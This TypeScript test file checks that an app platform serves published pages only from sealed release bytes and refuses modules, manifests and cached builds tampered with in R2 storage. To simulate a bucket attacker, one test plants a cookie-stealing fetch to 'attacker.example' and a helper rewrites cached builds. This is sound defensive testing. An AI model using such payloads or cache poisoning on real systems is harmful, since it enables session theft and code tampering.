import { toBase64 } from "@grasp-os/shared/encoding";
import { appIdSchema } from "@grasp-os/shared/ids";
import { env } from "cloudflare:workers";
import { eq } from "drizzle-orm";
import { drizzle } from "drizzle-orm/d1";
import { describe, expect, it } from "vite-plus/test";

import {
  heldManifest,
  loadRelease,
  sealedPage,
  versionManifest,
} from "../src/app-releases.ts";
import { versionFiles } from "../src/apps.ts";
import { appVersions } from "../src/db/core/schema.ts";
import {
  frameAccess,
  frameKey,
  frameObjectMaxBytes,
  stageFrame,
} from "../src/page-frame.ts";
import { commitApp, testApp, withFiles } from "./app-definitions.ts";
import type { TestSource } from "./app-definitions.ts";
import { release } from "./apps.ts";
import { mockIdp } from "./idp.ts";
import {
  frameDocument,
  loadFrame,
  moduleKeyOf,
  pathOf,
  routed,
} from "./page-frames.ts";
import { artifactKey, failure } from "./sealed-apps.ts";
import { signedInApi } from "./sign-in.ts";

// A page of a published version opens from the bytes its release sealed
// (app-releases.ts, `sealedPage`): built while the candidate is built,
// its hashes in the candidate's report, never compiled when someone opens
// it, and refused, not built, when the sealed bytes are missing.

const idp = mockIdp();

const files = testApp(
  { name: "Sealed pages", tables: {} },
  {
    "src/routes/index.tsx": `import { createFileRoute } from "@tanstack/react-router";

function Desk() {
  return <p>Desk</p>;
}
export const Route = createFileRoute("/")({ component: Desk });
`,
    "src/routes/inbox.tsx": `import { createFileRoute } from "@tanstack/react-router";

function Inbox() {
  return <p>Inbox</p>;
}
export const Route = createFileRoute("/inbox")({ component: Inbox });
`,
  }
);

/** Whether `key` is a page's cached build. */
const isPageBuild = (key: string): boolean =>
  key.startsWith("build-cache/") && key.includes("/page-build/");

/** Deletes every cached page build, so a build would have to start again. */
const clearBuildCache = async (): Promise<void> => {
  let cursor: string | undefined;
  do {
    // oxlint-disable-next-line no-await-in-loop -- one page after another
    const page = await env.FILES.list({ prefix: "build-cache/", cursor });
    const builds = page.objects
      .map(({ key }) => key)
      .filter((key) => isPageBuild(key));
    if (builds.length > 0) {
      // oxlint-disable-next-line no-await-in-loop -- see above
      await env.FILES.delete(builds);
    }
    cursor = page.truncated ? page.cursor : undefined;
  } while (cursor !== undefined);
};

/** How many page builds the cache holds. */
const cachedBuilds = async (): Promise<number> => {
  const page = await env.FILES.list({ prefix: "build-cache/" });
  return page.objects.filter(({ key }) => isPageBuild(key)).length;
};

/** Whether `key` is a page's or the server code's cached build. */
const isCachedBuild = (key: string): boolean =>
  key.startsWith("build-cache/") && /\/[a-z-]+-build\//u.test(key);

/**
 * Rewrites every entry cached in R2 that `isEntry` picks and holds `word`,
 * as someone who can write to the bucket but doesn't hold core's secret
 * could, keeping what it was written with: how many it rewrote.
 */
const poisonCache = async (
  word: string,
  isEntry: (key: string) => boolean = isCachedBuild
): Promise<number> => {
  let poisoned = 0;
  let cursor: string | undefined;
  do {
    // oxlint-disable-next-line no-await-in-loop -- one page after another
    const page = await env.FILES.list({ cursor, include: ["customMetadata"] });
    for (const { key, customMetadata } of page.objects) {
      if (!isEntry(key)) {
        continue;
      }
      // oxlint-disable-next-line no-await-in-loop -- one after another
      const object = await env.FILES.get(key);
      // oxlint-disable-next-line no-await-in-loop -- see above
      const text = (await object?.text()) ?? "";
      if (text.includes(word)) {
        // oxlint-disable-next-line no-await-in-loop -- see above
        await env.FILES.put(
          key,
          text.replaceAll(word, "PWNED"),
          customMetadata === undefined ? {} : { customMetadata }
        );
        poisoned += 1;
      }
    }
    cursor = page.truncated ? page.cursor : undefined;
  } while (cursor !== undefined);
  return poisoned;
};

/** An App running `files`, and who builds it. */
const published = async (released: TestSource = files) => {
  const builder = await signedInApi(idp, "builder");
  const { id } = await builder.api.apps.create({ name: "Sealed pages" });
  await release(builder, id, released);
  return { builder, app: id, id: appIdSchema.parse(id) };
};

/** Where a build's frame manifest is staged in R2. */
const manifestKey = frameKey;

/** The sha384 Subresource Integrity of `served`, as a browser checks it. */
const sha384 = async (served: string | Uint8Array): Promise<string> =>
  `sha384-${toBase64(
    new Uint8Array(
      await crypto.subtle.digest(
        "SHA-384",
        typeof served === "string" ? new TextEncoder().encode(served) : served
      )
    )
  )}`;

/** `text` as the UTF-8 bytes it encodes to. */
const encoded = (text: string): number[] => [...new TextEncoder().encode(text)];

/** What core answers for `path`: its status, and how long it may be kept. */
const served = async (path: string) => {
  const response = await routed(path);
  return {
    status: response.status,
    cache: response.headers.get("cache-control"),
  };
};

describe("pages sealed with their release", { timeout: 120_000 }, () => {
  it("opens a published page from its sealed bytes, without a build", async () => {
    const { builder, app, id } = await published();
    await clearBuildCache();

    const bundle = await builder.api.pages.open(app);
    const frame = await loadFrame(bundle);
    const sealed = await sealedPage(env, id, 1);

    expect({
      artifact: bundle.artifact === sealed.artifact,
      entry: frame?.entry,
      // What the frame loads is what was sealed, module for module.
      modules: Object.keys(frame?.modules ?? {}).toSorted(),
      // Nothing was compiled for it: the cache a build fills is still empty.
      built: await cachedBuilds(),
    }).toStrictEqual({
      artifact: true,
      entry: sealed.code.entry,
      modules: [
        ...Object.keys(sealed.code.kit),
        ...Object.keys(sealed.code.modules),
      ].toSorted(),
      built: 0,
    });
  });

  it("refuses to open a page whose sealed bytes are gone, and builds nothing", async () => {
    const { builder, app, id } = await published();
    const sealed = await loadRelease(env, id, 1);
    const entry = sealed.manifest.artifacts.find(
      ({ path }) => path === "pages.json"
    );
    await env.FILES.delete(await artifactKey(entry?.sha256 ?? ""));
    await clearBuildCache();

    expect({
      gone: await failure(async () => await builder.api.pages.open(app)),
      built: await cachedBuilds(),
    }).toStrictEqual({
      gone: "version.artifact_corrupt",
      built: 0,
    });
  });

  it("refuses sealed bytes that were changed", async () => {
    const { builder, app, id } = await published();
    const sealed = await loadRelease(env, id, 1);
    const entry = sealed.manifest.artifacts.find(
      ({ path }) => path === "pages.json"
    );
    await env.FILES.put(
      await artifactKey(entry?.sha256 ?? ""),
      JSON.stringify({ changed: true })
    );

    await expect(
      failure(async () => await builder.api.pages.open(app))
    ).resolves.toBe("version.artifact_corrupt");
  });

  it("names the sha384 of every module its frame loads, of the very bytes served", async () => {
    const { builder, app } = await published();
    const frame = await loadFrame(await builder.api.pages.open(app));
    if (frame === null) {
      throw new Error("An opened page has a frame");
    }

    const expected = Object.fromEntries(
      await Promise.all(
        Object.entries(frame.addresses).map(
          async ([name, address]) =>
            [address, await sha384(frame.modules[name] ?? "")] as const
        )
      )
    );
    expect(frame.integrity).toStrictEqual(expected);
  });

  it("refuses a staged module changed in R2, and stages it again from the sealed bytes at the next open", async () => {
    const { builder, app } = await published();
    const bundle = await builder.api.pages.open(app);
    const frame = await loadFrame(bundle);
    const [name, address] = Object.entries(frame?.addresses ?? {}).find(
      ([named]) => named.startsWith("app~")
    ) ?? ["", ""];
    const original = frame?.modules[name];

    // Whoever can write the bucket swaps the module's code, and keeps
    // what else core stored beside it.
    const key = moduleKeyOf(address);
    const staged = await env.FILES.head(key);
    await env.FILES.put(
      key,
      'fetch("https://attacker.example/" + document.cookie);',
      {
        customMetadata: staged?.customMetadata ?? {},
      }
    );
    const tampered = await served(pathOf(address));
    // The frame now misses a module: its document runs nothing.
    const document = await frameDocument(bundle);

    const reopened = await loadFrame(await builder.api.pages.open(app));

    expect({
      tampered: { status: tampered.status, cache: tampered.cache },
      document: document.status,
      healed: reopened?.modules[name],
    }).toStrictEqual({
      tampered: { status: 404, cache: "no-store" },
      document: 404,
      healed: original,
    });
  });

  it("refuses a staged module whose code and what core stored beside it were both changed", async () => {
    const { builder, app } = await published();
    const frame = await loadFrame(await builder.api.pages.open(app));
    const [, address] = Object.entries(frame?.addresses ?? {}).find(([named]) =>
      named.startsWith("app~")
    ) ?? ["", ""];

    await env.FILES.put(moduleKeyOf(address), "export default 1;", {
      customMetadata: { mac: "AAAA" },
    });

    const { status } = await served(pathOf(address));
    expect(status).toBe(404);
  });

  it("refuses a staged module or manifest larger than core stages, unread, and stages no build that large", async () => {
    const { builder, app } = await published();
    const bundle = await builder.api.pages.open(app);
    const frame = await loadFrame(bundle);
    const [, address] = Object.entries(frame?.addresses ?? {}).find(([named]) =>
      named.startsWith("app~")
    ) ?? ["", ""];
    const huge = new Uint8Array(frameObjectMaxBytes + 1);

    const key = moduleKeyOf(address);
    const kept = await env.FILES.head(key);
    await env.FILES.put(key, huge, {
      customMetadata: kept?.customMetadata ?? {},
    });
    const module = await served(pathOf(address));
    const moduleKept = await env.FILES.head(key);

    await builder.api.pages.open(app);
    const manifest = await env.FILES.head(manifestKey(bundle.artifact));
    await env.FILES.put(manifestKey(bundle.artifact), huge, {
      customMetadata: manifest?.customMetadata ?? {},
    });
    const document = await frameDocument(bundle);
    const manifestKept = await env.FILES.head(manifestKey(bundle.artifact));

    const staging = await failure(async () => {
      await stageFrame(env, "c".repeat(64), {
        entry: "app~huge",
        runtime: "app~huge",
        modules: { "app~huge": "x".repeat(frameObjectMaxBytes + 1) },
        addresses: { "app~huge": "d".repeat(64) },
        kit: {},
        css: "",
      });
    });

    expect({
      module: module.status,
      moduleKept: moduleKept !== null,
      document: document.status,
      manifestKept: manifestKept !== null,
      staging,
    }).toStrictEqual({
      module: 404,
      moduleKept: false,
      document: 404,
      manifestKept: false,
      staging: "page.build_failed",
    });
  });

  it("serves a module that starts with a byte order mark, or holds a lone surrogate, as the bytes its integrity names", async () => {
    const bom = "\uFEFFexport default 1;\n";
    const surrogate = 'export default "\uD800";\n';
    const code = {
      entry: "app~bom",
      runtime: "app~bom",
      modules: { "app~bom": bom, "app~surrogate": surrogate },
      addresses: { "app~bom": "1".repeat(64), "app~surrogate": "2".repeat(64) },
      kit: {},
      css: "",
    };
    const artifact = "b".repeat(64);
    await stageFrame(env, artifact, code);
    const frame = await loadFrame({
      artifact,
      frameToken: await frameAccess(env, artifact),
    });
    const modules = await Promise.all(
      Object.entries(frame?.addresses ?? {}).map(async ([name, address]) => {
        const response = await routed(pathOf(address));
        const bytes = new Uint8Array(await response.arrayBuffer());
        return {
          name,
          status: response.status,
          bytes: [...bytes],
          integrity: frame?.integrity[address] === (await sha384(bytes)),
        };
      })
    );

    expect(
      modules.toSorted((a, b) => a.name.localeCompare(b.name))
    ).toStrictEqual([
      { name: "app~bom", status: 200, bytes: encoded(bom), integrity: true },
      {
        name: "app~surrogate",
        status: 200,
        bytes: encoded(surrogate),
        integrity: true,
      },
    ]);
  });

  it("refuses a frame manifest changed in R2, or moved from another build, and stages it again at the next open", async () => {
    const { builder, app } = await published();
    // Another build: a build is stored by what it is, so the same files
    // would be this one.
    const other = await published(
      withFiles(files, {
        // Other code: a comment alone compiles to the same build.
        "src/routes/index.tsx": `${files.files["src/routes/index.tsx"] ?? ""}export const another = "build";\n`,
      })
    );
    const desk = await builder.api.pages.open(app);
    const inbox = await other.builder.api.pages.open(other.app);
    const deskFrame = await loadFrame(desk);

    // Another App's manifest, MAC and all, under desk's build.
    const inboxManifest = await env.FILES.get(manifestKey(inbox.artifact));
    await env.FILES.put(
      manifestKey(desk.artifact),
      (await inboxManifest?.text()) ?? "",
      { customMetadata: inboxManifest?.customMetadata ?? {} }
    );
    const moved = await frameDocument(desk);

    // Desk's own manifest, its entry pointed elsewhere, its MAC kept.
    await builder.api.pages.open(app);
    const deskManifest = await env.FILES.get(manifestKey(desk.artifact));
    const text = (await deskManifest?.text()) ?? "{}";
    await env.FILES.put(
      manifestKey(desk.artifact),
      JSON.stringify({ ...JSON.parse(text), entry: "app~elsewhere" }),
      { customMetadata: deskManifest?.customMetadata ?? {} }
    );
    const edited = await frameDocument(desk);

    const reopened = await loadFrame(await builder.api.pages.open(app));

    expect({
      moved: {
        status: moved.status,
        cache: moved.headers.get("cache-control"),
      },
      edited: {
        status: edited.status,
        cache: edited.headers.get("cache-control"),
      },
      reopened: reopened?.entry,
    }).toStrictEqual({
      moved: { status: 404, cache: "no-store" },
      edited: { status: 404, cache: "no-store" },
      reopened: deskFrame?.entry,
    });
  });

  it("seals and serves what its files build to, not a build rewritten in R2's cache", async () => {
    const { builder, app, id } = await published();
    // The next version builds to what the first did, so sealing it asks
    // the cache for the builds the first left there.
    const { version } = await commitApp(
      builder.api.apps.files,
      app,
      { "src/routes/index.tsx": `${files.files["src/routes/index.tsx"]}\n` },
      "Again"
    );
    const poisoned = {
      pages: await poisonCache("Desk"),
      server: await poisonCache("Sealed pages"),
    };
    await builder.api.apps.versions.publish(app, version);

    const sealed = await sealedPage(env, id, version);
    const frame = await loadFrame(await builder.api.pages.open(app));
    const running = await loadRelease(env, id, version);

    expect({
      rewrote: poisoned.pages > 0 && poisoned.server > 0,
      sealed: JSON.stringify(sealed.code).includes("PWNED"),
      served: JSON.stringify(frame?.modules ?? {}).includes("PWNED"),
      server: JSON.stringify([running.modules, running.app]).includes("PWNED"),
    }).toStrictEqual({
      rewrote: true,
      sealed: false,
      served: false,
      server: false,
    });
  });

  it("reads an unsealed version's manifest from its code, not an inspection rewritten in R2's cache", async () => {
    const { builder, app, id } = await published();
    // Not made current, so not sealed: its manifest is its code's
    // inspection, kept in R2 for the same code.
    const { version } = await commitApp(
      builder.api.apps.files,
      app,
      { "src/routes/index.tsx": `${files.files["src/routes/index.tsx"]}\n` },
      "Again"
    );
    const saved = await versionFiles(env, id, version);
    await versionManifest(env, id, version, saved);
    const rewrote = await poisonCache("Sealed pages", (key) =>
      key.includes("/inspection/")
    );

    // What core only holds is asked first, before an inspection again
    // writes its own over the rewritten one.
    const held = await heldManifest(env, id, version, saved);
    const manifest = await versionManifest(env, id, version, saved);

    expect({
      rewrote: rewrote > 0,
      read: JSON.stringify(manifest).includes("PWNED"),
      held: JSON.stringify(held ?? {}).includes("PWNED"),
    }).toStrictEqual({ rewrote: true, read: false, held: false });
  });

  it("refuses to make a version current whose page doesn't build", async () => {
    const { builder, app, id } = await published();
    const { version } = await commitApp(
      builder.api.apps.files,
      app,
      {
        "src/routes/broken.tsx":
          'import { createFileRoute } from "@tanstack/react-router"; import leftPad from "left-pad";\nexport const Route = createFileRoute("/broken")({ component: () => leftPad });\n',
      },
      "Broken"
    );

    const refused = await failure(
      async () => await builder.api.apps.versions.publish(app, version)
    );
    const versions = await drizzle(env.DB)
      .select()
      .from(appVersions)
      .where(eq(appVersions.appId, id))
      .all();

    const { currentVersion } = await builder.api.apps.get(app);

    expect({
      refused,
      current: currentVersion,
      status: versions.find((row) => row.version === version)?.status,
    }).toStrictEqual({
      refused: "page.build_failed",
      current: 1,
      status: "failed",
    });
  });
});
